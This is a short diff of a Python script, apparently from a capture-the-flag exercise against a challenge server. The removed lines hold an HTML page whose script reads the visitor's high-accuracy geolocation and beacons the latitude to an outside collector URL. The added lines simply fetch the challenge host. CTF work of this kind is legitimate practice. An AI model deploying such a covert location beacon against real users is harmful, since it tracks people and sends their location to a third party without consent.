@@ -1,21 +1,6 @@
-from src.HTTPEncodings import encodeURIComponent
-from src.HTTPEncodings import decodeURIComponent
-from src.Utils import https_host
-import webbrowser
+from src.HTTPSync import get
+from src.JSCore import js_eval
 
-url = https_host("""
-<html>
-    <head>
-        <title> hello </title>
-    </head>
-    <body>
-        <script>
-            navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', d.coords.latitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
-        </script>
-    </body>
-</head>
-""")
+headers = {}
 
-webbrowser.open(url)
-
-
+resp = get("http://chall.polygl0ts.ch:9009/")
